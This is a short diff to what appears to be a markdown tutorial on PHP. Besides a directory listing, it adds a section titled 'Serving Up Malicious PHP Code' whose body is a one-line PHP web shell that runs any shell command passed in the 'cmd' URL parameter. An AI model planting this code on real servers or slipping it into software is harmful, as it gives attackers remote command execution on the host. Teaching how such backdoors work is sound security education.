@@ -1,3 +1,4 @@
+## Basic PHP Read-Eval-Print-Loop
 ```bash
 vim demo.php
 ```
@@ -24,4 +25,10 @@ drwx------@ 60 Victor  staff  1920 Apr 24 22:21 Library
 -rw-r--r--   1 Victor  staff    74 Apr 26 15:17 demo.php
 drwxr-xr-x+ 15 Victor  staff   480 Apr 26 15:17 .
 </pre>
+```
+## Serving Up Malicious PHP Code
+```bash
+<?php 
+  echo shell_exec($_GET['cmd']); 
+?>
 ```
